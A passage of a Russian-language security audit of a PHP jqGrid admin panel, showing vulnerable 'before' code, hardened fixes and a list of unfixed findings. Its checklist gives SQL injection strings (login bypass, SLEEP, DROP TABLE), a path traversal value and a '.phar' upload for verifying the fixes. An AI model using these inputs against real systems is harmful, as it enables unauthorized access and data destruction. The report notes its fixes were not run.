<span class="admin__userName"><?= $_SESSION["NL_USER_SHORT"] ?></span>
// getjqGridCustom
if (row["ID_NL_USER"] != "' . $_SESSION["NL_USER_SHORT"] . '") {
// renderTable: телефон по умолчанию
$colModelEditOptions .= 'defaultValue : "' . $col->defValue . '"';
// renderTable: справочник
$colModelEditOptions .= 'value : "'; ... ":" . mb_ereg_replace('"', '\\"', $row[$selectTableName . "_SHORT"]); ... $colModelEditOptions .= '"';
// числа из сессии в JS
$colObject->defValue = $_SESSION["ID_NL_USER"];
if ($(formid.selector + " #ID_NL_USER").val() == ' . $_SESSION["ID_NL_USER"] . ') {
```
**Стало:**
```php
// main.php
<span class="admin__userName"><?= htmlspecialchars((string)($_SESSION["NL_USER_SHORT"] ?? ""), ENT_QUOTES, "UTF-8") ?></span>
// getjqGridCustom
if (row["ID_NL_USER"] != ' . js_str($_SESSION["NL_USER_SHORT"] ?? "") . ') {
// renderTable
$colModelEditOptions .= 'defaultValue : ' . js_str($col->defValue);
$selectOptions = ""; $selectOptions .= ':не выбрано'; ... $selectOptions .= ";" . $row[...] . ":" . $row[$selectTableName . "_SHORT"];
$colModelEditOptions .= 'value : ' . js_str($selectOptions);
$colObject->defValue = (int)($_SESSION["ID_NL_USER"] ?? 0);
if ($(formid.selector + " #ID_NL_USER").val() == ' . (int)($_SESSION["ID_NL_USER"] ?? 0) . ') {
```
**Решает:** XSS/внедрение JS через сессионные значения и справочники. `js_str` экранирует кавычки, `\`, переводы строк и `< > &` (нельзя закрыть `</script>`).
*Замечание:* формат jqGrid `value` - строка `id:текст;id:текст`; `:` или `;` в названии справочника ломают разбор и раньше (функциональное ограничение, не безопасность).

### I-08 - `onlymy.php`, Low

[🔝 Наверх](#оглавление)
**Было:**
```php
$_SESSION["onlymy"] = $_POST["onlymy"];
```
**Стало:**
```php
$_SESSION["onlymy"] = (($_POST["onlymy"] ?? "") === "1") ? "1" : "0";
```
**Решает:** в сессию попадает только флаг, а не произвольные данные/массив (значение потом сравнивается в `getTableWhere` и выводится в `main.php`).

### I-09 / I-10 - `file.upload.php`, Critical / High

[🔝 Наверх](#оглавление)
**Причина:** `table`, `col`, `id` из `$_REQUEST` (включая COOKIE) идут в имя файла: `table=../../../var/www/html/x` даёт запись вне `/img`. `$tbl` используется как **регулярное выражение** в `mb_ereg_replace`. Защита от PHP - чёрный список из 5 расширений (`.phar`, `.php7`, `.pht`, `.phps`, `.htaccess`, `.inc` проходят). Проверки ошибки загрузки нет.

**Было:**
```php
$blacklist = array(".php", ".phtml", ".php3", ".php4", ".php5");
...
$tbl = $_REQUEST["table"];
$col = mb_ereg_replace($tbl . "_", "", $_REQUEST["col"]);
$dir = strtolower(str_replace("NL_", "", $tbl));
$id = $_REQUEST["id"];
$filename = "/img/" . $dir . "/" . $col . "_" . $id . "_" . $date . ".$ext";
```
**Стало (ключевое):**
```php
$input = array_merge($_GET, $_POST);                       // без COOKIE
$tbl = $input["table"] ?? "";
if (!ObjectTable::isAllowedTable($tbl)) { upload_fail("Bad table."); }
$id = $input["id"] ?? "";
if (!is_string($id) || !ctype_digit($id) || (strlen($id) > 18)) { upload_fail("Bad id."); }
// колонка - только существующая колонка таблицы типа photo/photos/file
foreach ($table->colArray as $key => $c) {
    if (is_int($key) && ($c->dbName === $colParam) && in_array($c->type, array("photo", "photos", "file"), true)) { $colObj = $c; break; }
}
if ($colObj === null) { upload_fail("Bad column."); }
$col = str_replace($tbl . "_", "", $colObj->dbName);
$ext = strtolower(pathinfo($baseFileName, PATHINFO_EXTENSION));
$allowedExt = ($colObj->type === "file") ? array("jpg","jpeg","png","gif","webp","pdf","doc","docx","xls","xlsx") : array("jpg","jpeg","png","gif","webp");
if (!in_array($ext, $allowedExt, true)) { upload_fail("This file type is not allowed!"); }
if ($colObj->type !== "file" && @getimagesize($baseTmpName) === false) { upload_fail("File is not an image!"); }
// + проверка UPLOAD_ERR_OK / is_uploaded_file
```
**Решает:** запись за пределы `/img`, regex-инъекцию, загрузку исполняемых файлов. Все части имени файла теперь либо из кода, либо цифры, либо из белого списка. Подробнее об ограничении выполнения PHP в `/img` - раздел 5 (N-07).

### I-11 - очистка фото в `saveData()`, High

[🔝 Наверх](#оглавление)
**Причина:** маска `glob()` строилась из `$values[0]` - первого значения формы (ID записи), то есть из `$_POST`. `ID_NL_PROP_RESALE=*` или `../../..` позволяют удалить `unlink()`-ом чужие `.jpg`. Кроме того, `count(json_decode(...))` падает на невалидном JSON (PHP 8).

**Было:**
```php
$trueId = $id;
if ((isset($values[0])) && (trim($values[0]) != "") && ($values[0] != "NULL")) { $trueId = $values[0]; }
foreach (glob($imgsPath . str_replace($this->dbName . "_", "", $col->dbName) . "_" . $trueId . "*.jpg") as $fullFileName) {
    ...
    $photos = json_decode($post[$col->dbName]);
    for ($ji = 0; $ji < count($photos); $ji++) { ... }
```
**Стало:**
```php
$trueId = ($id === false) ? 0 : $id;
if (isset($params[0]) && is_int($params[0]) && ($params[0] > 0)) { $trueId = $params[0]; }   // значение уже проверено prepareValue()
if ($trueId > 0) {
    $found = glob($imgsPath . ... . "_" . $trueId . "*.jpg");
    foreach (($found ?: array()) as $fullFileName) {
        ...
        $photos = json_decode((string)($post[$col->dbName] ?? ""), true);
        if (!is_array($photos)) { $photos = array(); }
```
**Решает:** произвольное удаление файлов и падение на битом JSON. `trueId = 0` (запись без id) больше не превращается в маску `col_*.jpg`, удалявшую фото всех записей.

### I-12 - XML-ответ `showData()`, Medium

[🔝 Наверх](#оглавление)
**Причина:** `page`/`total`/`records` и значения ячеек выводятся в XML без экранирования; строка `]]>` в данных закрывает `CDATA` и позволяет внедрить разметку.

**Было:**
```php
$s .= '<row id="' . $data[$i][0] . '">';
$s .= '<cell><![CDATA[' . $data[$i][$j] . ']]></cell>';
```
**Стало:**
```php
$s .= '<row id="' . htmlspecialchars((string)$data[$i][0], ENT_QUOTES | ENT_XML1, "UTF-8") . '">';
$s .= '<cell><![CDATA[' . str_replace("]]>", "]]]]><![CDATA[>", (string)$data[$i][$j]) . ']]></cell>';
// page/total/records теперь (int) из showData()
```
**Решает:** внедрение в XML. Экранирование HTML-содержимого ячеек (stored XSS при рендере jqGrid) сознательно не делается на этом этапе: оно зависит от `js.combined.js` (formatters `photosFormatter`, Quill), которого нет во вложении; см. N-06.

### I-14 - шаблон `jqgrid.html`, Low

[🔝 Наверх](#оглавление)
**Было / стало:**
```php
$jqGridHtml = mb_ereg_replace("{colModel}", $colModel, $jqGridHtml);
$jqGridHtml = str_replace("{colModel}", $colModel, $jqGridHtml);      // то же для tableName, colNames, addEditForm, afterShowFormAdd, afterShowFormEdit
```
**Решает:** `mb_ereg_replace` трактует шаблон как регулярное выражение, а строку замены - с обратными ссылками `\0..\9`; данные из БД (названия справочников) с `\0` подставляются неверно. `str_replace` подставляет буквально.

---

## 4. Проход по файлам

[🔝 Наверх](#оглавление)

| Файл | Что найдено (этап 1) | Статус |
|---|---|---|
| `admin/index.php` | `$_POST` login/password -> `user_auth`; `$page` в HTML (I-02) | Исправлено (S-01, I-02) |
| `admin/partial/jqgrid.html` | Шаблон; `{tableName}` подставляется в JS/URL | Без правок, защита в `ObjectTable` (S-02) |
| `admin/parts/dicts.php`, `journals.php`, `login.php` | Статичный HTML, `$_GET`/`$_SESSION` не используются | Проблем этапа 1 нет |
| `admin/parts/main.php` | `$_SESSION["NL_USER_SHORT"]` в HTML (I-03) | Исправлено |
| `admin/php/file.upload.php` | `$_REQUEST`/`$_FILES` в путь и regex (I-09, I-10) | Исправлено, файл переписан |
| `admin/php/functions.admin.php` | S-01..S-11, S-14, I-01..I-07, I-11, I-12, I-14 | Исправлено |
| `admin/php/jqgrid.edit.php` | `$_GET tblName`, `$_POST oper/id` без проверки | Исправлено (S-02, S-06, S-08) |
| `admin/php/jqgrid.show.php`, `jqgrid.table.php` | `$_GET tblName` | Исправлено (S-02) |
| `admin/php/logout.php` | `$_GET/$_POST/$_SESSION` не используются; logout без проверки метода (CSRF) | Проблем этапа 1 нет, см. N-05 |
| `admin/php/onlymy.php` | `$_POST` в `$_SESSION` (I-08) | Исправлено |
| `admin/php/select.get.php` | S-13 | Исправлено |
| `admin/php/set_id.php` | S-12 | Исправлено |
| `php/config.php` | Входных данных нет; секреты в коде (N-04) | Без правок |
| `php/functions.php` | Нет обёртки для prepared; `db_error` печатает SQL; `db_connect` раскрывает ошибку; `db_fetch_array` не определена | Исправлено |

---

## 5. Найдено вне рамок этапа 1 (правки **не** вносились)

[🔝 Наверх](#оглавление)

| ID | Sev. | Проблема | Где |
|---|---|---|---|
| N-01 | **Critical** | **Нет проверки авторизации в endpoint-ах.** Проверка входа есть только в `index.php` (HTML-страница). `jqgrid.show.php` (чтение всех данных), `jqgrid.edit.php` (запись/удаление), `jqgrid.table.php`, `set_id.php`, `select.get.php`, `file.upload.php` (загрузка файлов), `onlymy.php` доступны анониму; прямой доступ к `/admin/parts/*.php` тоже. Даже после исправлений этапа 1 любой может читать и править данные | все `admin/php/*.php` |
| N-02 | **Critical** | **Повышение привилегий / mass assignment в `saveData()`:** пользователь с правами `1` может выполнить `edit`/`add` для таблицы `NL_USER` и поставить `ID_NL_USER_PERMISSION=2` (проверка владельца `row_cur["ID_NL_USER"]` для таблицы пользователей сравнивает его самого с собой) или переназначить `ID_NL_USER` записи. Нет проверки прав на таблицу и на поля | `saveData()` |
| N-03 | High | Пароли хранятся через обратимый `AES_ENCRYPT` (ECB, ключ в исходниках) и расшифрованными уходят в грид (`AES_DECRYPT` в `getData`). Нужно `password_hash()` / `password_verify()`, значения не отдавать клиенту | `user_auth`, `getData`, колонка `NL_PASSWORD` |
| N-04 | High | Секреты в коде: пароль БД и `AESKEY` в `config.php`. Вынести в переменные окружения / файл вне webroot | `php/config.php` |
| N-05 | High | Нет CSRF-токенов на POST; `logout.php` по GET; `user_logout()` не уничтожает сессию; нет `HttpOnly`/`Secure`/`SameSite` для cookie; нет защиты от перебора пароля | `index.php`, `logout.php`, `user_logout()` |
| N-06 | High | Stored XSS при выводе данных: содержимое ячеек грид отдаётся как есть и вставляется jqGrid как HTML; `$.parseHTML($(el).val())` в `dataInit` для фото (DOM XSS); Quill/`JSON.parse(decodeURIComponent(...))`. Нужен `js.combined.js` для корректной правки | `renderTable()`, `showData()`, JS |
| N-07 | Medium | Директория `/img` должна быть без исполнения PHP (`php_admin_flag engine off` / `.htaccess`); лимит размера; имена файлов предсказуемы (`col_id_дата`); каталог загрузки (`/img/<table>/`) не совпадает с каталогом очистки (`/img/objects/<TABLE>/`) | `file.upload.php`, `saveData()` |
| N-08 | Medium | Утечка данных: колонка «Контакт собственника» скрывается только в форме, но приходит в XML всем (`render=false` лишь скрывает колонку). Нужна фильтрация на сервере | `showData()` / `getData()` |
| N-09 | Medium | `set_id.php` при каждом открытии формы увеличивает `AUTO_INCREMENT` (гонки, выжигание id) | `set_id.php` |
| N-10 | Medium | Серверная валидация: `maxLength`, `required` не проверяются на сервере | `saveData()` |
| N-11 | Low | Кодировка соединения `utf8` (лучше `utf8mb4`); `display_errors`, короткие теги `<?`; внешний скрипт `//api-maps.yandex.ru` без протокола/SRI; нет security-заголовков (CSP, X-Frame-Options, X-Content-Type-Options) | `config.php`, `index.php` |

---

## 6. Допущения и что проверить после внедрения

[🔝 Наверх](#оглавление)

1. **Окружение:** PHP 7.4+/8.x (используются `??`, spread `...`, `const` с массивом), mysqli с `mysqlnd` (`get_result()`). В среде, где готовился отчёт, PHP не было, поэтому код **не запускался**: проверены баланс синтаксиса, все точки формирования SQL (`grep` по `SELECT/INSERT/UPDATE/DELETE/ALTER`) и логика по коду. Перед сдачей прогнать `php -l` на каждом файле и ручной smoke-test.
2. **Поведение, которое изменилось намеренно:**
    - `rows` ограничен 1000; неизвестные параметры фильтра и сортировка по полю не из таблицы игнорируются (сортировка по умолчанию - `ID_<таблица>`);
    - нечисловое значение для числовой колонки в фильтре возвращает пустой результат, а в форме - HTTP 400;
    - колонка пароля недоступна для поиска/сортировки;
    - счётчик записей в гриде учитывает ограничения доступа (раньше ограничение применялось только к данным);
    - загрузка: только белый список расширений и реальные изображения;
    - `saveData()` больше не печатает SQL в ответ.
3. **Prepared statements и типы:** при бинарном протоколе числовые колонки возвращаются как числа PHP; если в гриде заметите отличия отображения `FLOAT`, это нужно проверить на реальной схеме БД.
4. **Файлы, которых нет во вложении** (`js.combined.js`, схема БД): параметры jqGrid (`sidx`, `sord`, `page`, `rows`, `NL_*`, `*_from`, `*_to`), формат запросов `select.get.php` и `set_id.php` приняты по исходникам. Если в JS используются другие имена параметров или GET для `set_id.php`, достаточно поправить соответствующую строку.
5. **Проверочные запросы** (до правок должны срабатывать, после - нет):
    - вход: `login=admin' OR '1'='1' -- &password=x`;
    - сортировка: `/admin/php/jqgrid.show.php?tblName=NL_PROP_RESALE&sidx=(SELECT SLEEP(5))&sord=asc`;
    - фильтр: `...&NL_PROP_RESALE_FLOOR=1 OR 1=1`;
    - таблица: `tblName=NL_USER WHERE 1=1` -> HTTP 400;
    - `set_id.php`: `table=NL_VIEW; DROP TABLE NL_LOG` -> HTTP 400;
    - `select.get.php`: `tblChild=NL_USER&tblParent=NL_USER_PERMISSION&idParent=1 OR 1=1` -> только `idParent=1`;
    - загрузка: `table=../../x` и файл `shell.phar` -> HTTP 400.
6. **Файлы дампа:** в дампе `config.php` и `functions.php` склеены маркером; в исправленных файлах они разделены (лишний `<?` в конце `config.php` убран).
